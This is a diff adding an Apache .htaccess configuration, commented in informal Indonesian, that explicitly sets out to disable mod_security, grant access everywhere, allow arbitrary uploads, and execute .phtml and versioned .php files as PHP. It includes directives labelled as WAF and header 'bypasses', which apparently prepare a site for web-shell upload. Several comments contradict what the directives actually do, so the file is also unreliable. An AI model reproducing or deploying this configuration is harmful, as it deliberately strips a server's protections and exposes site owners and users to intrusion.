@@ -1,0 +1,45 @@
+# Disable semua security Apache
+<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecRuleEngine Off
+</IfModule>
+
+# Allow override semua
+<Directory />
+    Options All
+    AllowOverride All
+    Require all granted
+</Directory>
+
+# Bebas upload file apa aja
+<IfModule mod_authz_core.c>
+    Require all granted
+</IfModule>
+
+# Disable PHP execution limit (kalo ada)
+php_value upload_max_filesize 100M
+php_value post_max_size 100M
+php_value memory_limit 256M
+php_value max_execution_time 300
+php_value max_input_time 300
+
+# Allow semua MIME type buat upload
+<IfModule mod_mime.c>
+   AddType application/x-httpd-php .php .php5 .php7 .phtml
+</IfModule>
+
+# Disable directory listing protection
+Options -Indexes
+
+# Rewrite buat bypass WAF (kalo ada)
+RewriteEngine On
+RewriteCond %{REQUEST_URI} !^/admin
+RewriteRule ^(.*)$ $1 [L]
+
+# Allow semua method (POST, PUT, dll)
+<IfModule mod_rewrite.c>
+    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+</IfModule>
+
+# Tambah custom header buat bypass
+Header always set Access-Control-Allow-Origin "*"
